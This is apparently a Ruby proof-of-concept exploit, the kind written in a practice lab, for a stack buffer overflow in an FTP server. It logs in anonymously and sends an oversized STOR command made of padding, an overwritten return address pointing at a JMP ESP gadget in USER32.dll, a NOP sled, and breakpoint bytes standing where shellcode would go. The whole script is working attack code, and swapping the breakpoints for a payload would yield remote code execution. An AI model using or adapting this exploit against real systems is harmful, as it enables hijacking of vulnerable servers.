require 'socket'

#ESP 00C3B6B8
#buffer ends 00C3BA98
#so we have 992 bytes
buffer = "\x41" * 965   #padding

#make EIP point to 77D8AF0A which contains JMP ESP in USER32.dll
buffer += "\x0A\xAF\xD8\x77" #backwards for little endian

buffer += "\x90" * 16 #nops on the end for some breathing room

buffer += "\xcc" * 1015 #breakpoints

puts 'Sending evil buffer'

Socket.tcp('192.168.11.13', 21) do |s|
    s.recvfrom 1024

    s.sendmsg "USER ftp\r\n"
    s.recvfrom 1024

    s.sendmsg "PASS ftp\r\n"
    s.recvfrom 1024

    s.sendmsg "STOR #{buffer}\r\n"
end
